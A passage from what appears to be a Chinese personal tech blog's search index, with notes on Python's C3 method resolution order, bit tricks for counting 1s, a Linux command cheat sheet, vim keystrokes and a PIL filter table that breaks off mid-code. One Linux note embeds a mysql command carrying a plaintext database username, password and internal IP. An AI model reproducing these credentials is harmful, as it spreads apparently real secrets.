   \    / \ _    |                   |</span><br><span class="line">                     \  /      \  |                   |</span><br><span class="line">                      ---      ---                    |</span><br><span class="line">Level 1            1 | B |    | C | 2                 |</span><br><span class="line">                      ---      ---                    |</span><br><span class="line">                        \      /                      |</span><br><span class="line">                         \    /                      \ /</span><br><span class="line">                           ---</span><br><span class="line">Level 0                 0 | A |              </span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">L[A] = A + merge(BDEO,CDFO,BC)</span><br><span class="line">     = A + B + merge(DEO,CDFO,C)</span><br><span class="line">     = A + B + C + merge(DEO,DFO)</span><br><span class="line">     = A + B + C + D + merge(EO,FO)</span><br><span class="line">     = A + B + C + D + E + merge(O,FO)</span><br><span class="line">     = A + B + C + D + E + F + merge(O,O)</span><br><span class="line">     = A B C D E F O</span><br></pre></td></tr></tbody></table></figure><h5 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; O = object</span><br><span class="line">&gt;&gt;&gt; class F(O): pass</span><br><span class="line">&gt;&gt;&gt; class E(O): pass</span><br><span class="line">&gt;&gt;&gt; class D(O): pass</span><br><span class="line">&gt;&gt;&gt; class C(D,F): pass</span><br><span class="line">&gt;&gt;&gt; class B(E,D): pass</span><br><span class="line">&gt;&gt;&gt; class A(B,C): pass</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">                           6</span><br><span class="line">                          ---</span><br><span class="line">Level 3                  | O |</span><br><span class="line">                       /  ---  \</span><br><span class="line">                      /    |    \</span><br><span class="line">                     /     |     \</span><br><span class="line">                    /      |      \</span><br><span class="line">                  ---     ---    ---</span><br><span class="line">Level 2        2 | E | 4 | D |  | F | 5</span><br><span class="line">                  ---     ---    ---</span><br><span class="line">                   \      / \     /</span><br><span class="line">                    \    /   \   /</span><br><span class="line">                     \  /     \ /</span><br><span class="line">                      ---     ---</span><br><span class="line">Level 1            1 | B |   | C | 3</span><br><span class="line">                      ---     ---</span><br><span class="line">                       \       /</span><br><span class="line">                        \     /</span><br><span class="line">                          ---</span><br><span class="line">Level 0                0 | A |</span><br><span class="line">                          ---</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; A.mro()</span><br><span class="line">(&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class '__main__.E'&gt;,</span><br><span class="line">&lt;class '__main__.C'&gt;, &lt;class '__main__.D'&gt;, &lt;class '__main__.F'&gt;,</span><br><span class="line">&lt;type 'object'&gt;)</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="什么时候对MRO来说是非法的？"><a href="#什么时候对MRO来说是非法的？" class="headerlink" title="什么时候对MRO来说是非法的？"></a>什么时候对MRO来说是非法的？</h4><p>- </p><h5 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h5>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; O = object</span><br><span class="line">&gt;&gt;&gt; class X(O): pass</span><br><span class="line">&gt;&gt;&gt; class Y(O): pass</span><br><span class="line">&gt;&gt;&gt; class A(X,Y): pass</span><br><span class="line">&gt;&gt;&gt; class B(Y,X): pass</span><br></pre></td></tr></tbody></table></figure>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> -----------</span><br><span class="line">|           |</span><br><span class="line">|    O      |</span><br><span class="line">|  /   \    |</span><br><span class="line"> - X    Y  /</span><br><span class="line">   |  / | /</span><br><span class="line">   | /  |/</span><br><span class="line">   A    B</span><br><span class="line">   \   /</span><br><span class="line">     ?</span><br></pre></td></tr></tbody></table></figure>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">L[O] = 0</span><br><span class="line">L[X] = X O</span><br><span class="line">L[Y] = Y O</span><br><span class="line">L[A] = A X Y O</span><br><span class="line">L[B] = B Y X O</span><br></pre></td></tr></tbody></table></figure>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L[C] = C + merge(AXYO, BYXO, AB)</span><br><span class="line">     = C + A + merge(XYO, BYXO, B)</span><br><span class="line">     = C + A + B + merge(XYO, YXO)</span><br></pre></td></tr></tbody></table></figure><ul><li>这时，我们不能合并列表XYO和列表YXO，：因此，没有了符合规则的head，C3算法停止。在这种情形下，Python 2.3会抛出一个异常(TypeError: MRO conflict among bases Y, X)，因为X在YXO的tail中,而Y在XYO的tail中,阻止创建模棱两可的继承层次。Python 2.2不会抛出异常，而是选择了一种特定的方法解析顺序(CABXYO).</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂-整数的二进制中有几个1</title>
      <link href="/uncatesgorized/2021-03-07-%E6%9D%82-%E6%95%B4%E6%95%B0%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD%E6%9C%89%E5%87%A0%E4%B8%AA1/"/>
      <url>/uncatesgorized/2021-03-07-%E6%9D%82-%E6%95%B4%E6%95%B0%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD%E6%9C%89%E5%87%A0%E4%B8%AA1/</url>
      
        <content type="html"><![CDATA[<h3 id="x-x-1-消除x最后一位的1"><a href="#x-x-1-消除x最后一位的1" class="headerlink" title="x &amp; (x - 1) 消除x最后一位的1"></a>x &amp; (x - 1) 消除x最后一位的1</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = 15</span><br><span class="line">15 = 0b1111</span><br><span class="line">14 = 0b1110</span><br><span class="line">y = x &amp; (x-1)</span><br><span class="line">y = 0b1110  # 消去了x最后一位的1</span><br><span class="line"></span><br><span class="line">y = 14</span><br><span class="line">14 = 0b1110</span><br><span class="line">13 = 0b1101</span><br><span class="line">z = y &amp; (y-1)</span><br><span class="line">z = 0b1100  # 消去了y最后一位的1</span><br><span class="line">……</span><br></pre></td></tr></tbody></table></figure><ul><li>O(1) 时间检测X是否是2的n次方<blockquote><p>一个数如果是2的n次方，则这个数的二进制中只有一个1<br>如果消去最后一位的1，则这个数为0</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = 16</span><br><span class="line">16 = 0b10000</span><br><span class="line">15 = 0b01111</span><br><span class="line">x &amp; (x - 1) = 0</span><br></pre></td></tr></tbody></table></figure></li><li>一个整数的二进制中有多少个1<blockquote><p>x &amp; (x - 1) 可以消除最后一位的1<br>while循环消除最后一位的1，直到结果为0</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = 15</span><br><span class="line">b = 0</span><br><span class="line">while a &gt; 0:</span><br><span class="line">a = a &amp; (a - 1)</span><br><span class="line">b += 1</span><br><span class="line">print b # 1的个数</span><br></pre></td></tr></tbody></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-常用命令整理</title>
      <link href="/uncatesgorized/2021-03-07-Linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
      <url>/uncatesgorized/2021-03-07-Linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h4 id="开进程并发下载"><a href="#开进程并发下载" class="headerlink" title="开进程并发下载"></a>开进程并发下载</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for ((s=1987;s&lt;2019;s=s+1))</span><br><span class="line">do</span><br><span class="line">for ((m=1;m&lt;13;m=m+1))</span><br><span class="line">do</span><br><span class="line">aa=($s'_'$m)</span><br><span class="line">echo $aa</span><br><span class="line">wget https://transtats.bts.gov/PREZIP/On_Time_Reporting_Carrier_On_Time_Performance_1987_present_$aa.zip &amp;</span><br><span class="line">done</span><br><span class="line">done</span><br></pre></td></tr></tbody></table></figure><h4 id="远程复制"><a href="#远程复制" class="headerlink" title="远程复制"></a>远程复制</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从前面的文件夹复制到后面的文件夹</span><br><span class="line">scp -r remote_username@remote_ip:remote_folder local_folder</span><br></pre></td></tr></tbody></table></figure><h4 id="查看外网ip"><a href="#查看外网ip" class="headerlink" title="查看外网ip"></a>查看外网ip</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L tool.lu/ip</span><br></pre></td></tr></tbody></table></figure><h4 id="查看文件大小"><a href="#查看文件大小" class="headerlink" title="查看文件大小"></a>查看文件大小</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">du -h --max-depth=0 ./2017_credits.txt</span><br><span class="line"></span><br><span class="line">由小到大</span><br><span class="line">du -sh * | sort -n</span><br><span class="line">由大到小</span><br><span class="line">du -sh * | sort -nr</span><br></pre></td></tr></tbody></table></figure><h4 id="查看ip"><a href="#查看ip" class="headerlink" title="查看ip"></a>查看ip</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show</span><br></pre></td></tr></tbody></table></figure><h4 id="看日志"><a href="#看日志" class="headerlink" title="看日志"></a>看日志</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看线上日志要用less/more，千万别用vi，vi会一次把文件全读入，内存耗光</span><br></pre></td></tr></tbody></table></figure><h4 id="远程文件弄到本地文件夹"><a href="#远程文件弄到本地文件夹" class="headerlink" title="远程文件弄到本地文件夹"></a>远程文件弄到本地文件夹</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copy(remote_file, local_file_dir)</span><br></pre></td></tr></tbody></table></figure><h4 id="echo导出select数据"><a href="#echo导出select数据" class="headerlink" title="echo导出select数据"></a>echo导出select数据</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo "select * from miveshow_money.user_credits_history limit 1" | mysql -umiveshow -h10.0.110.115 -pmiveshow123 -Dmiveshow &gt; o</span><br></pre></td></tr></tbody></table></figure><h4 id="统计文件和文件夹的总量"><a href="#统计文件和文件夹的总量" class="headerlink" title="统计文件和文件夹的总量"></a>统计文件和文件夹的总量</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls | wc -l</span><br></pre></td></tr></tbody></table></figure><h4 id="统计文件个数"><a href="#统计文件个数" class="headerlink" title="统计文件个数"></a>统计文件个数</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l |grep "^-"|wc -l</span><br></pre></td></tr></tbody></table></figure><h4 id="统计当前目录下的所有目录"><a href="#统计当前目录下的所有目录" class="headerlink" title="统计当前目录下的所有目录"></a>统计当前目录下的所有目录</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">文件以-开头</span><br><span class="line">目录以d开头</span><br><span class="line"></span><br><span class="line">1、ls -l | grep "^d"</span><br><span class="line"></span><br><span class="line">目录以/结尾</span><br><span class="line"></span><br><span class="line">2、ls -F | grep "/$"</span><br><span class="line"></span><br><span class="line">配合查看文件数量的命令查看目录数量</span><br><span class="line"></span><br><span class="line">ls -l | grep "^d" | wc -l</span><br></pre></td></tr></tbody></table></figure><h4 id="排序、去重"><a href="#排序、去重" class="headerlink" title="排序、去重"></a>排序、去重</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort -n test.txt | uniq</span><br></pre></td></tr></tbody></table></figure><h4 id="grep多个关键字-or"><a href="#grep多个关键字-or" class="headerlink" title="grep多个关键字(or)"></a>grep多个关键字(or)</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep file.txt -E "aaa|bbb|ccc"</span><br></pre></td></tr></tbody></table></figure><h4 id="删除多行"><a href="#删除多行" class="headerlink" title="删除多行"></a>删除多行</h4><p>删除多行，闭区间[1,999]</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi file.txt</span><br><span class="line">:1,999d</span><br></pre></td></tr></tbody></table></figure><h4 id="覆盖方式生成文件"><a href="#覆盖方式生成文件" class="headerlink" title="覆盖方式生成文件"></a>覆盖方式生成文件</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.log | grep test &gt; result.txt</span><br></pre></td></tr></tbody></table></figure><h4 id="生成或追加到文件"><a href="#生成或追加到文件" class="headerlink" title="生成或追加到文件"></a>生成或追加到文件</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.log | grep test &gt;&gt; result.txt</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-vim基本操作命令</title>
      <link href="/uncatesgorized/2021-03-07-Linux-vim%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
      <url>/uncatesgorized/2021-03-07-Linux-vim%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h4 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h4><ul><li><p><code>i</code></p><blockquote><p>insert 进入编辑模式</p></blockquote></li><li><p><code>I</code></p><blockquote><p>insert before line 在行首开始插入</p></blockquote></li><li><p><code>a</code></p><blockquote><p>append 和 ==i== 相似，不同在于在当前光标所在字母前，还是后插入（一试便知）</p></blockquote></li><li><p><code>A</code></p><blockquote><p>append after line 在行尾开始插入</p></blockquote></li><li><p><code>o</code></p><blockquote><p>open a line below 在当前行下面新生成一行并进入编辑模式（你是不是还在的敲回车呢！）</p></blockquote></li><li><p><code>O</code></p><blockquote><p>append a line above 在当前行上一行开始插入</p></blockquote></li><li><p><code>Ctrl + h</code></p><blockquote><p>删除上一个字符</p></blockquote></li><li><p><code>Ctrl + w</code></p><blockquote><p>删除上一个单词</p></blockquote></li><li><p><code>Ctrl + u</code></p><blockquote><p>删除当前行</p></blockquote></li></ul><h4 id="Normal模式"><a href="#Normal模式" class="headerlink" title="Normal模式"></a>Normal模式</h4><ul><li><code>:set nu</code><blockquote><p>设置行号</p></blockquote></li><li><code>:set hls</code><blockquote><p>设置搜索结果高亮</p></blockquote></li><li><code>:set incsearch</code><blockquote><p>增量搜索结果高亮</p></blockquote></li><li><code>:vs</code><blockquote><p>垂直分屏</p></blockquote></li><li><code>:sp</code><blockquote><p>水平分屏</p></blockquote></li><li><code>:q</code><blockquote><p>退出当前分屏 </p></blockquote></li><li><code>:% s/hello/world/g</code><blockquote><p>将当前文件中的hello替换为world</p></blockquote></li><li><code>:% s/\&lt;xxx\&gt;/yyy/g</code><blockquote><p>正则匹配xxx</p></blockquote></li></ul><h6 id="替换标志位"><a href="#替换标志位" class="headerlink" title="替换标志位"></a>替换标志位</h6><ul><li><code>g</code> global 全局范围内执行</li><li><code>c</code> confirm 表示确认，可以确认或拒绝修改</li><li><code>n</code> number 报告匹配到的次数而不替换，可以用来查询匹配次数</li></ul><h6 id="反人类的上下左右"><a href="#反人类的上下左右" class="headerlink" title="反人类的上下左右"></a>反人类的上下左右</h6><p>hjkl</p><ul><li><code>h</code> 左移(四个键的最左边)</li><li><code>l</code> 右移(四个键的最右边)</li><li><code>j</code> 下移</li><li><code>k</code> 上移</li></ul><h6 id="单词间移动"><a href="#单词间移动" class="headerlink" title="单词间移动"></a>单词间移动</h6><p>word：以非空白符分割的单词(真单词)<br>WORD：以空白符分割的单词(不一定是单词)</p><ul><li><code>w/W</code> 移动到下一个单词word/WORD的开头</li><li><code>e/E</code> 移动到下一个单词word/WORD的结尾</li><li><code>b/B</code> 移动带上一个单词word/WORD的开头</li></ul><h6 id="行间搜索移动"><a href="#行间搜索移动" class="headerlink" title="行间搜索移动"></a>行间搜索移动</h6><ul><li><code>f{char}</code>  同一行搜索并移动到该字符</li><li><code>t{char}</code>  同行搜索并移动到该字符的前一个字符</li><li><code>; </code>分号下一个</li><li><code>, </code>逗号上一个</li><li><code>F{char}</code> 反过来搜索前面的字符</li><li><code>0</code> 移动到行首第一个字符</li><li><code>^</code> 移动到第一个非空字符</li><li><code>$</code> 移动到行尾</li><li><code>g_</code> 移动到行尾非空白字符</li><li><code>zz</code> 把当前行置为屏幕中间</li></ul><h6 id="文件开头、结尾"><a href="#文件开头、结尾" class="headerlink" title="文件开头、结尾"></a>文件开头、结尾</h6><ul><li><code>gg</code> 快速移动到文件开头</li><li><code>G</code> 快速移动到文件结尾</li></ul><h6 id="屏幕开头、中间、结尾"><a href="#屏幕开头、中间、结尾" class="headerlink" title="屏幕开头、中间、结尾"></a>屏幕开头、中间、结尾</h6><ul><li><code>H</code> Head  跳转到屏幕开头</li><li><code>M</code> Middle 跳转到屏幕中间</li><li><code>L</code> Lower 跳转到屏幕结尾</li></ul><h6 id="翻页"><a href="#翻页" class="headerlink" title="翻页"></a>翻页</h6><ul><li><code>Ctrl + u</code> upword 向上翻页</li><li><code>Ctrl + f</code> forward 向下翻页</li></ul><h4 id="Visual可视模式"><a href="#Visual可视模式" class="headerlink" title="Visual可视模式"></a>Visual可视模式</h4><ul><li><code>v</code><blockquote><p>VISUAL 进入可视模式，此时按上下左右可选中状态</p></blockquote></li><li><code>V</code><blockquote><p>VISUAL LINE 选中整行</p></blockquote></li><li><code>Ctrl v</code><blockquote><p>VISUAL BLOCK 方块选中</p></blockquote></li></ul><h5 id="选中之后干什么"><a href="#选中之后干什么" class="headerlink" title="选中之后干什么"></a>选中之后干什么</h5><ul><li><code>d</code><blockquote><p>delete 删除选中内容</p></blockquote></li><li><code>y</code><blockquote><p>yanke 复制选中内容</p></blockquote></li><li><code>p</code><blockquote><p>paste 粘贴内容（在当前光标位置后或下以行粘贴内容）</p></blockquote></li></ul><h4 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h4><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><ul><li><code>Ctrl + [</code><blockquote><p>快速切换Insert模式到Normal模式</p></blockquote></li><li><code>gi</code><blockquote><p>快速回到最后一次编辑的位置</p></blockquote></li></ul><h4 id="Vim增删改查"><a href="#Vim增删改查" class="headerlink" title="Vim增删改查"></a>Vim增删改查</h4><h6 id="增加字符"><a href="#增加字符" class="headerlink" title="增加字符"></a>增加字符</h6><ul><li><code>a/i/o</code></li></ul><h6 id="快速删除"><a href="#快速删除" class="headerlink" title="快速删除"></a>快速删除</h6><ul><li><code>x</code> 快速删除一个字符</li><li><code>d</code> 配合文本对象快速删除一个单词</li><li><code>d</code>和<code>x</code>都可以搭配数字来执行多次</li><li><code>dw</code>==<code>daw</code> 删除单词个空格</li><li><code>diw</code> 删除单词，不删空格</li><li><code>dt{char}</code> 删除光标到目标字符之间的所有字符</li><li><code>d0</code> 删除到行首之间的字符</li><li><code>d$</code> 删除到行尾之间的字符</li><li><code>4x</code> 删除4个字符</li><li><code>2dd</code> 删除两行</li></ul><h6 id="快速修改"><a href="#快速修改" class="headerlink" title="快速修改"></a>快速修改</h6><ul><li><code>r</code> replace r{char} 替换光标所在字符</li><li><code>R</code> 以替换的形式输入</li><li><code>c</code> change</li><li><code>s</code> substitute 删除光标所在字符，并进入插入模式</li><li><code>2s</code> 删除两个字符并进入插入模式</li></ul><h6 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h6><ul><li><code>/</code> 正向查询</li><li><code>?</code> 反向查询</li><li><code>n</code> 跳转到下一个匹配</li><li><code>N</code> 跳转到上一个匹配</li><li><code>*</code> 进行当前单词的前向匹配</li><li><code>#</code> 进行当前单词的后向匹配</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-PIL—Mode,ImageFilter对比实践</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Mode-ImageFilter%E5%AF%B9%E6%AF%94%E5%AE%9E%E8%B7%B5/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Mode-ImageFilter%E5%AF%B9%E6%AF%94%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h4 id="原图"><a href="#原图" class="headerlink" title="原图"></a>原图</h4><ul><li>学习 一定要找一个好的Object(???)，不然怎么学的下去嘛。<br><img src="https://img-blog.csdnimg.cn/20190727193629193.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h4 id="图像的mode"><a href="#图像的mode" class="headerlink" title="图像的mode"></a>图像的mode</h4><ul><li>mode属性是图像的色彩通道的数量和名字，同时也包括像素的类型和颜色深度信息。她们之间的区别可能要放大点才能看得清，比如说一万倍?。<table><thead><tr><th>modes</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>1位像素，黑和白，存成8位的像素</td></tr><tr><td>L</td><td>8位像素，黑白</td></tr><tr><td>P</td><td>8位像素，使用调色板映射到任何其他模式</td></tr><tr><td>RGB</td><td>3*8位像素，真彩</td></tr><tr><td>RGBA</td><td>4*8位像素，真彩+透明通道</td></tr><tr><td>CMYK</td><td>4*8位像素，颜色隔离</td></tr><tr><td>YCbCr</td><td>3*8位像素，彩色视频格式</td></tr><tr><td>I</td><td>32位整形像素</td></tr><tr><td>F</td><td>32位浮点型像素</td></tr><tr><td>RGBX</td><td>有padding的真彩色</td></tr><tr><td>HSV</td><td></td></tr></tbody></table></li></ul><p><img src="https://img-blog.csdnimg.cn/20190727193538101.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="图像滤波器"><a href="#图像滤波器" class="headerlink" title="图像滤波器"></a>图像滤波器</h4><ul><li>你更喜欢花非花，雾非雾的朦胧，还是线条清晰，棱角分明的透彻。<table><thead><tr><th>Filter</th><th>描述</th></tr></thead><tbody><tr><td>BLUR</td><td>模糊滤波</td></tr><tr><td>CONTOUR</td><td>轮廓滤波</td></tr><tr><td>DETAIL</td><td>细节增强滤波</td></tr><tr><td>EDGE_ENHANCE</td><td>边缘增强滤波</td></tr><tr><td>EDGE_ENHANCE_MORE</td><td>深度边缘增强滤波</td></tr><tr><td>EMBOSS</td><td>浮雕滤波</td></tr><tr><td>FIND_EDGES</td><td>寻找边缘信息的滤波</td></tr><tr><td>SMOOTH</td><td>平滑滤波</td></tr><tr><td>SMOOTH_MORE</td><td>深度平滑滤波</td></tr><tr><td>SHARPEN</td><td>锐化滤波</td></tr></tbody></table></li></ul><p><img src="https://img-blog.csdnimg.cn/2019072719355829.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="原代码"><a href="#原代码" class="headerlink" title="原代码"></a>原代码</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span 